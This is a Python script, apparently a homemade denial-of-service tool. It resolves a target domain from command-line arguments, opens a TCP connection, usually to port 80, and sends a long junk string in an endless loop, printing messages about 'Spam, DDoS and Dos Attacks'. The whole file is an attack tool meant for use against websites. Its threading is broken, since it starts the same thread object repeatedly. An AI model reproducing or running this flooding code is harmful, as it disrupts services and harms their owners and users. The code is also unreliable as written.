
import socket
import time
import sys
import threading

Port = 80

try:
	if sys.argv[1] == '-domain':
		Domain = sys.argv[2]
		if sys.argv[3] == '-thread':
			thread = sys.argv[4]
			thread = int(thread)
			try:
				if sys.argv[5] == '-port':
					Port = sys.argv[6]
					Port = int(Port)
					if sys.argv[7] == '-print-attack':
						printAttack = True
					else:
						printAttack = False
				else:
					if sys.argv[5] == '-print-attack':
						printAttack = True
					else:
						printAttack = False
			except:
				print("[WARNING] You use the Port 80 because its the Website URL Port")
				print("          You can change it with -port <Target Port> ")
				print()
		else:
			print("[+] Select the Thread argument with -thread")
			sys.exit()
	else:
		print("[+] Select the Domain argument with -domain")
		sys.exit()
except:
	print("[+] Select the arguments")
	sys.exit()

Target = socket.gethostbyname(Domain)

def Attack():
	sockv4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	Target = socket.gethostbyname(Domain)
	try:
		sockv4.connect((Target, Port))
	except:
		print(f"[+] Domain: {Domain} Port: {Port} is down")
		sys.exit()
	Value = 1
	while True:
		try:
			if printAttack == True:
				print(f"[+] [{Value}] Sending Target Spam, DDoS and Dos Attacks Domain: {Domain}")
				Value = Value + 1
			sockv4.send("jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeusih 8kjfmvenzgdufhbgzrhvhdjdfhnbhfmgtkzitugftdguikmjuzhtgfghuztdsredtzuiooiufzfjksdhgfuzvudhkjuwzfhkigj8hebuiklurgikrjohr9khu8l54ou9zti8hlk8j,khujouj5tjiukl.hiluihoktlgtik5öiulljihukbjhkiu8kgjjgkijkjujujujhiurlkihuzkhluhtguhi7zutrkztujtgrtjijhghtuliokjuirjgiutujgiujubufrfjbirofjgiutkjknbdgutirikgjfkgjhiktfjgihogkfkjguitikrjgutikrfjgitrlfkghzitogkgjzhktg".encode())
			sockv4.sendall("jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeusih 8kjfmvenzgdufhbgzrhvhdjdfhnbhfmgtkzitugftdguikmjuzhtgfghuztdsredtzuiooiufzfjksdhgfuzvudhkjuwzfhkigj8hebuiklurgikrjohr9khu8l54ou9zti8hlk8j,khujouj5tjiukl.hiluihoktlgtik5öiulljihukbjhkiu8kgjjgkijkjujujujhiurlkihuzkhluhtguhi7zutrkztujtgrtjijhghtuliokjuirjgiutujgiujubufrfjbirofjgiutkjknbdgutirikgjfkgjhiktfjgihogkfkjguitikrjgutikrfjgitrlfkghzitogkgjzhktg".encode())
		except:
			sys.exit()

AttackValue = threading.Thread(target=Attack)
print(f"[+] Target Domain: {Domain}")
print(f"[+] Target Ipaddress: {Target}")
print(f"[+] Target Attacking with Spam, DDoS and Dos attacks")
time.sleep(3)
print(f"[!] Attack Starting loading Attacks to Attacking him")
time.sleep(2)
print(f"[!] Attack Started to Domain: {Domain} with loadet Attacks")
print(f"    Port: 80 Attacking because its Website URL Port")
print(f"    You can change the Port with argument -port")
if printAttack == True:
	pass
else:
	print(f"     You cant see the attack when you would see")
	print(f"     it then use argument -print-attack")
time.sleep(5)
for attacking in range(thread):
	AttackValue.start()